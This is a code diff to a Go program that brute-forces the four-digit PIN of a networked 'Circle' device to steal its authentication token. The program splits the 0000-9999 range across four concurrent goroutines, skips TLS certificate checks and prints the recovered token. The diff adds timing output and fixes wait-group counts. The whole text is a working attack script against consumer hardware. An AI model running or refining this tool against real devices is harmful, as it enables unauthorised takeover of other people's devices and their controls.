@@ -15,12 +15,14 @@ import (
 type CircleSession struct {
 	Client    http.Client
 	IpAddress string
+	StartTime time.Time
 	Wg        sync.WaitGroup
 }
 
 const APPID = "HackMyCircleDevice99" // min length: 20
 
 func (session *CircleSession) findCircleToken(start int, stop int) {
+	defer session.Wg.Done()
 	for x := start; x <= stop; x++ {
 		pincode := fmt.Sprintf("%04d", x)
 		// show some progress
@@ -54,7 +56,7 @@ func (session *CircleSession) findCircleToken(start int, stop int) {
 		json.Unmarshal(body, &data)
 		//fmt.Println(data)
 		if data["result"] == "success" {
-			fmt.Printf("APPID  : %v\nPINCODE: %v\nTOKEN  : %v\n", APPID, pincode, data["token"])
+			fmt.Printf("APPID  : %v\nPINCODE: %v\nTOKEN  : %v\nElapse Time: %v\n", APPID, pincode, data["token"], time.Since(session.StartTime).Seconds())
 			break
 		} else {
 			if data["error"] == "token request failure - invalid app id" {
@@ -81,14 +83,14 @@ func main() {
 	tr := &http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 	}
-	session := &CircleSession{Client: http.Client{Transport: tr}, IpAddress: ipAddress}
+	session := &CircleSession{Client: http.Client{Transport: tr}, IpAddress: ipAddress, StartTime: time.Now()}
 	session.Wg.Add(1)
 	go session.findCircleToken(0, 2500)
-	session.Wg.Add(2)
+	session.Wg.Add(1)
 	go session.findCircleToken(2501, 5000)
-	session.Wg.Add(2)
+	session.Wg.Add(1)
 	go session.findCircleToken(5001, 7500)
-	session.Wg.Add(2)
+	session.Wg.Add(1)
 	go session.findCircleToken(7501, 9999)
 	session.Wg.Wait()
 	os.Exit(0)
